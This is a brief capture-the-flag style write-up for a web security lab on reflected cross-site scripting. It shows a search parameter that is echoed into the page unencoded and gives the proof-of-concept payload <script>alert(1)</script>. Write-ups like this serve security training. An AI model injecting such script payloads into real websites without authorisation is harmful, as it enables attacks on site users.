# Reflected XSS into HTML context with nothing encoded

## Lab Description :
![Cap dashboard screenshot](xss-level-1-1.png)

## Solution :
We straightaway see a search functionality.

![Cap dashboard screenshot](xss-level-1-2.png)

The application echoes the supplied search term in the response to this URL:

``https://0a650005031fe4c282a94ddd00e50078.web-security-academy.net/?search=hello``

![Cap dashboard screenshot](xss-level-1-3.png)

Click View Selection Source, shows how our data is being embedded in the page.

``<h1>0 search results for 'hello'</h1>``

### Payload

Enter the following simple XSS payload to trigger an alert!

``<script>alert(1)</script>``

![Cap dashboard screenshot](xss-level-1-4.png)

We have thus solved the lab.

![Cap dashboard screenshot](xss-level-1-5.png)


#### Visit The Next Page For The Next Level :)
